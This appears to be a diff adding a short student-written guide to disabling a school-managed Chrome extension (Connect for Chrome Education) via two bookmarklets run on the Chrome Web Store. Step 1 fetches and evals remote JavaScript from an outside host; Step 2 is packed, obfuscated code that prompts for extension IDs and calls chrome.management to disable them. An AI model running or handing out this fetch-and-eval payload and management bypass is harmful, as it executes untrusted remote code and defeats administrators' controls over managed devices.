@@ -1,0 +1,16 @@
+Basically just go to chrome web store do step 1 then do step 2 put them both as boomarks by replacing url with the javascript.
+
+
+Step 1:javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+
+
+Step 2:javascript:eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('d(\'c b a: (9 8 7)\').6(\',\').5(0=>{4.3.2(0,!1)})',14,14,'i||setEnabled|management|chrome|forEach|split|commas|by|seperated|here|IDs|Extension|prompt|uninstall'.split('|'),0,{}))
+
+
+                                                        GUIDE
+
+When ou do step 1 in Chrome webstore it should pop up with admin settings. The thing you need to remove Connect For Chrome Education 
+
+The code should be ddfbkhpmcdbciejenfcolaaiebnjcbfc 
+
+Then post that code into step 2 then Connect for chrome education should be removed just shut off your computer to return it 
